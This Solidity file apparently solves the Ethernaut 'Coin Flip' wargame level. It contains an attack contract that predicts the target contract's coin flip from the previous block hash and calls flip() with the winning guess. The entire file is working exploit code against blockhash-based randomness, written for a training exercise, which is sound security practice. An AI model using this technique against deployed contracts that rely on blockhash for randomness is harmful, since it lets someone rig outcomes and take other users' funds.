// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./CoinFlip.sol";

contract AttackingCoinFlip {
    address public contractAddress;
    CoinFlip public coinFlipContract;
    uint256 private lastHash;
    uint256 private constant FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;



    constructor(address _contractAddress) {
        contractAddress = _contractAddress;
        coinFlipContract = CoinFlip(_contractAddress);
    }

    function hackContract() external {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        coinFlipContract.flip(side);
        // for(uint i = 0; i <=10; i++){
        // coinFlipContract.flip(side);
        // }
    }
    
}
